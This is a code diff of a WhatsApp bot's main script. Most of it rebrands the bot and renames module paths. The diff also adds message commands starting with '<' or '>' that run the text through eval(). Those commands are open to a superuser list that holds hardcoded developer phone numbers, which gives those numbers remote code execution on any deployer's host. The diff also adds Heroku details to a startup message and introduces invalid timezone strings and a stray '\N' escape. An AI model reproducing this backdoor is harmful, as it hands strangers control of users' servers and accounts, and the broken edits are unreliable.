@@ -39,13 +39,13 @@ let path = require("path");
 const FileType = require('file-type');
 const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
 //import chalk from 'chalk'
-const { verifierEtatJid , recupererActionJid } = require("./data/antilien");
-const { atbverifierEtatJid , atbrecupererActionJid } = require("./data/antibot");
+const { verifierEtatJid , recupererActionJid } = require("./fbase/antilien");
+const { atbverifierEtatJid , atbrecupererActionJid } = require("./fbase/antibot");
 let evt = require(__dirname + "/timnasa/timoth");
-const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./data/banUser");
-const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./data/banGroup");
-const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./data/onlyAdmin");
-//const //{loadCmd}=require("/fredi/mesfonctions")
+const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./fbase/banUser");
+const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./fbase/banGroup");
+const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./fbase/onlyAdmin");
+//const //{loadCmd}=require("/timnasa/mesfonctions")
 let { reagir } = require(__dirname + "/timnasa/app");
 var session = conf.session.replace(/TIMNASA-TMD;;;=>/g,"");
 const prefixe = conf.PREFIXE;
@@ -83,7 +83,7 @@ authentification();
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Timnasa-Md', "safari", "1.0.0"],
+            browser: ['Timnasa-TMd', "safari", "1.0.0"],
             printQRInTerminal: true,
             fireInitQueries: false,
             shouldSyncHistoryMessage: true,
@@ -117,7 +117,7 @@ authentification();
 // Function to get the current date and time in Tanzania
 function getCurrentDateTime() {
     const options = {
-        timeZone: 'Africa/Nairobi', // Tanzania time zone
+        timeZone: 'Africa/Dar Es Salam', // Tanzania time zone
         year: 'numeric',
         month: '2-digit',
         day: '2-digit',
@@ -134,7 +134,7 @@ function getCurrentDateTime() {
 setInterval(async () => {
     if (conf.AUTO_BIO === "yes") {
         const currentDateTime = getCurrentDateTime(); // Get the current date and time
-        const bioText = `Timnasa-Md is running 🚗\n${currentDateTime}`; // Format the bio text
+        const bioText = `TIMNASA-TMD is running 🚗\n${currentDateTime}`; // Format the bio text
         await zk.updateProfileStatus(bioText); // Update the bio
         console.log(`Updated Bio: ${bioText}`); // Log the updated bio
     }
@@ -790,7 +790,7 @@ async function sendVCard(jid, baseName) {
             document: { url: vCardPath },
             mimetype: 'text/vcard',
             fileName: `${name}.vcf`,
-            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\n TIMNASA MD👊`
+            caption: `Contact saved as ${name}. Please import this vCard to add the number to your contacts.\n\N TIMNASA TMD👊`
         });
 
         console.log(`vCard created and sent for: ${name} (${jid})`);
@@ -814,7 +814,7 @@ zk.ev.on("messages.upsert", async (m) => {
     if (!ms.message) return;
 
     const origineMessage = ms.key.remoteJid;
-    const baseName = "Timnasa-Md";
+    const baseName = "Lucky-Md";
 
     // Check if the message is from an individual and if contact is not saved
     if (origineMessage.endsWith("@s.whatsapp.net") && (!store.contacts[origineMessage] || !store.contacts[origineMessage].name)) {
@@ -826,7 +826,7 @@ zk.ev.on("messages.upsert", async (m) => {
         
         // Send additional message to inform the contact of their new saved name
         await zk.sendMessage(origineMessage, {
-            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nTIMNASA-MD`
+            text: `Ssup Your name has been saved as "${assignedName}" in my account.\n\nTIMNASA-TMD`
         });
 
         console.log(`Contact ${assignedName} has been saved and notified.`);
@@ -837,7 +837,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
 
 // Default auto-reply message
-let auto_reply_message = "Hello,its Timnasa Md on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
+let auto_reply_message = "Hello,its Timnasa TMd on board. My owner is currently unavailable. Please leave a message, and we will get back to you as soon as possible.";
 
 // Track contacts that have already received the auto-reply
 let repliedContacts = new Set();
@@ -876,7 +876,7 @@ zk.ev.on("messages.upsert", async (m) => {
         repliedContacts.add(remoteJid);
     }
 });
-      
+        
         zk.ev.on("messages.upsert", async (m) => {
             const { messages } = m;
             const ms = messages[0];
@@ -920,12 +920,12 @@ zk.ev.on("messages.upsert", async (m) => {
             }
             
             var membreGroupe = verifGroupe ? ms.key.participant : '';
-            const { getAllSudoNumbers } = require("./data/sudo");
+            const { getAllSudoNumbers } = require("./fbase/sudo");
             const nomAuteurMessage = ms.pushName;
             const abu1 = '255752593977';
-            const abu2 = '255620814108';
-            const abu3 = "255764182801";
-            const abu4 = '255752593977';
+            const abu2 = '255756469954';
+            const abu3 = "255784766591";
+            const abu4 = '255784766591';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -1026,10 +1026,70 @@ if (conf.AUTO_READ === 'yes') {
         }
     });
 }
+            
+
+if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
+        zk.sendMessage(auteurMessage, {
+          'text': `🚫am blocking you because you have violated ${conf.OWNER_NAME} policies🚫!`
+        });
+        await zk.updateBlockStatus(auteurMessage, 'block');
+      }
+      
+
+      if (texte && texte.startsWith('<')) {
+  if (!superUser) {
+    return repondre(`Only for my ${conf.DEV} or ${conf.OWNER_NAME} to use this command 🚫`);
+  }
+  
+  try { 
+    let evaled = await eval(texte.slice(1)); 
+    if (typeof evaled !== 'string') {
+      evaled = require('util').inspect(evaled); 
+    }
+    await repondre(evaled); 
+  } catch (err) { 
+    await repondre(String(err)); 
+  } 
+      }
+      
+if (texte && texte.startsWith('>')) {
+  // If the sender is not the owner
+  if (!superUser) {
+    const menuText = `This command is only for the owner or Fredie to execute 🚫`;
+
+    await zk.sendMessage(origineMessage, {
+      text: menuText,
+      contextInfo: {
+        externalAdReply: {
+          title: conf.BOT,
+          body: conf.OWNER_NAME,
+          sourceUrl: conf.GURL,
+          thumbnailUrl: conf.URL,
+          mediaType: 1,
+          showAdAttribution: true,
+          renderLargerThumbnail: false
+        }
+      }
+    });
+    return; 
+  }
+
+  try {
+    let evaled = await eval(texte.slice(1));
+
+    // If the evaluated result is not a string, convert it to a string
+    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
+
+    // Send back the result of the evaluation
+    await repondre(evaled);
+  } catch (err) {
+    // If there's an error, send the error message
+    await repondre(String(err));
+  }
+}
 
 
             /** ****** gestion auto-status  */
-                 
             if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                 await zk.readMessages([ms.key]);
             }
@@ -1061,7 +1121,7 @@ if (conf.AUTO_READ === 'yes') {
             
  //---------------------------------------rang-count--------------------------------
              if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
-  const { ajouterOuMettreAJourUserData } = require("./data/level"); 
+  const { ajouterOuMettreAJourUserData } = require("./fbase/level"); 
   try {
     await ajouterOuMettreAJourUserData(auteurMessage);
   } catch (e) {
@@ -1081,7 +1141,7 @@ if (conf.AUTO_READ === 'yes') {
             
                     if(superUser) {console.log('hummm') ; return ;} 
                     
-                    let mbd = require('./data/mention') ;
+                    let mbd = require('./fbase/mention') ;
             
                     let alldata = await mbd.recupererToutesLesValeurs() ;
             
@@ -1196,7 +1256,7 @@ if (conf.AUTO_READ === 'yes') {
                                        await fs.unlink("st1.webp");
 
                                     } else if(action === 'warn') {
-                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/warn') ;
+                                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./fbase/warn') ;
 
                             let warn = await getWarnCountByJID(auteurMessage) ; 
                             let warnlimit = conf.WARN_COUNT
@@ -1231,7 +1291,7 @@ if (conf.AUTO_READ === 'yes') {
         
     
     catch (e) {
-        console.log("data err " + e);
+        console.log("fbase err " + e);
     }
     
 
@@ -1294,7 +1354,7 @@ if (conf.AUTO_READ === 'yes') {
                await fs.unlink("st1.webp");
 
             } else if(action === 'warn') {
-                const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./data/warn') ;
+                const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./fbase/warn') ;
 
     let warn = await getWarnCountByJID(auteurMessage) ; 
     let warnlimit = conf.WARN_COUNT
@@ -1328,7 +1388,7 @@ if (conf.AUTO_READ === 'yes') {
          
             /////////////////////////
             
-            //execution des luckycmd   
+            //execution des fez   
             if (verifCom) {
                 //await await zk.readMessages(ms.key);
                 const cd = evt.cm.find((timoth) => timoth.nomCom === (com));
@@ -1381,12 +1441,12 @@ if (conf.AUTO_READ === 'yes') {
                     }
                 }
             }
-            //fin exécution luckycmd
+            //fin exécution fez
         });
         //fin événement message
 
 /******** evenement groupe update ****************/
-const { recupevents } = require('./data/welcome'); 
+const { recupevents } = require('./fbase/welcome'); 
 
 zk.ev.on('group-participants.update', async (group) => {
     console.log(group);
@@ -1395,7 +1455,7 @@ zk.ev.on('group-participants.update', async (group) => {
     try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
     } catch {
-        ppgroup = 'https://files.catbox.moe/7irwqn.jpeg';
+        ppgroup = 'https://files.catbox.moe/snh8mc.jpeg';
     }
 
     try {
@@ -1471,7 +1531,7 @@ zk.ev.on('group-participants.update', async (group) => {
         
     async  function activateCrons() {
         const cron = require('node-cron');
-        const { getCron } = require('./data/cron');
+        const { getCron } = require('./fbase/cron');
 
           let crons = await getCron();
           console.log(crons);
@@ -1489,7 +1549,7 @@ zk.ev.on('group-participants.update', async (group) => {
                   zk.sendMessage(crons[i].group_id, { image : { url : './media/chrono.webp'} , caption: "Hello, it's time to close the group; sayonara." });
 
                 }, {
-                    timezone: "Africa/Nairobi"
+                    timezone: "Africa/Dar Es Salam"
                   });
               }
         
@@ -1506,7 +1566,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
                  
                 },{
-                    timezone: "Africa/Nairobi"
+                    timezone: "Africa/Dar Es Salam"
                   });
               }
         
@@ -1533,7 +1593,7 @@ zk.ev.on('group-participants.update', async (group) => {
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
                 console.log("Timnasa is Online 🕸\n\n");
-                //chargement des luckycmd 
+                //chargement des fez 
                 console.log("Loading Timnasa Commands ...\n");
                 fs.readdirSync(__dirname + "/fez").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
@@ -1571,17 +1631,27 @@ zk.ev.on('group-participants.update', async (group) => {
 
 ║ Prefix: [ ${prefixe} ]
 ║ Mode: ${md}
-║ Model: TIMNASA TMD
-║ Owner: Timoth
+║ Model: TIMNASA-TMD
+║ Bot Name: Timnasa-TMd-Bot 
+║ Owner: Timnasa
 ╚═════ ❖ •✦
 -_-<-<-<-<-<-<-<--<-<-<-<-<-<
 
 *🪀Follow my channel for updates and free hacks🙃*
  
-> https://whatsapp.com/channel/0029VaihcQv84Om8LP59fO3f
+> https://whatsapp.com/channel/0029VajweHxKQuJP6qnjLM31 
 
 *Heroku App Configuration*
  
+*🐥Client name*
+> ${herokuAppName}
+
+*🦋Visit your bot web*
+> ${herokuAppLink}
+
+*🦁Client Number*
+> ${botOwner}
+
 -_-_-<€<€-<-<-<-<-<-<-<-<-<-<-<
                 
                  `;
